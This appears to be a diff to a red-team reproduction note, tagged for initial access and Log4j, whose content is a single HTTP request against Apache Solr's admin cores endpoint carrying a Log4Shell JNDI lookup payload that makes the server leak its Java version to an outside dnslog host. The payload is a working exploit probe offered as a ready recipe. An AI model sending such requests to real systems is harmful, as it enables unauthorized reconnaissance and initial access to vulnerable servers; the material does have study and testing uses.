@@ -1,3 +1,12 @@
+---
+type: 复现
+status: active
+created: 2026-09-11
+updated: 2026-11-13
+tags: [红队, 初始访问, 组件, Log4j]
+本线: 按需查
+---
+
 使用dnslog探测Java版本
 ```
 GET /solr/admin/cores?action=${jndi:ldap://${sys:java.version}.a57751c3.log.dnslog.pp.ua.} HTTP/1.1
